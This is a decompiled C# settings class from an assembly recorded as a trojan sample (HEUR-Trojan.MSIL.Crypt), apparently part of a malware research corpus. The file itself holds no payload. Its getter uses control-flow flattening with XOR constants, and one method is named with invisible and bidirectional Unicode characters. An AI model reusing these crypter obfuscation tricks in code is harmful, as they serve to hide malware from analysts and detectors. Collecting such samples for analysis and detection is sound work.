// Decompiled with JetBrains decompiler
// Type: Tetris.Properties.Settings
// Assembly: SMALLR, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 6D2A6844-DF52-4C3E-A39E-6BCAB729CFBF
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Crypt.gen-cb64837983ad6cdbc07df3dc8272a72b4d1b41314b797cc4f9bb67cd37f7b0f5.exe

using System.CodeDom.Compiler;
using System.Configuration;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

namespace Tetris.Properties
{
  [CompilerGenerated]
  [GeneratedCode("Microsoft.VisualStudio.Editors.SettingsDesigner.SettingsSingleFileGenerator", "16.10.0.0")]
  internal sealed class Settings : ApplicationSettingsBase
  {
    private static Settings defaultInstance = (Settings) Settings.\u200D‎‮‍‏‪‭‍‎⁭​⁭⁬⁪​‪‍‎‪‏‬⁯‌⁯⁪‎⁪⁮‫​‬‮​​⁯‎⁬‬‪‪‮((SettingsBase) new Settings());

    public static Settings Default
    {
      [MethodImpl(MethodImplOptions.NoInlining)] get
      {
label_1:
        int num1 = -1661568878;
        Settings defaultInstance;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -19393501)) % 4U)
          {
            case 0:
              goto label_1;
            case 1:
              defaultInstance = Settings.defaultInstance;
              num1 = (int) num2 * -1391717940 ^ -1442188820;
              continue;
            case 3:
              num1 = (int) num2 * -1486653318 ^ 259709807;
              continue;
            default:
              goto label_5;
          }
        }
label_5:
        return defaultInstance;
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public Settings()
    {
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    static Settings()
    {
    }

    internal static bool RestartPrototype() => true;

    internal static bool CancelPrototype() => false;

    static SettingsBase \u200D‎‮‍‏‪‭‍‎⁭​⁭⁬⁪​‪‍‎‪‏‬⁯‌⁯⁪‎⁪⁮‫​‬‮​​⁯‎⁬‬‪‪‮([In] SettingsBase obj0) => SettingsBase.Synchronized(obj0);
  }
}
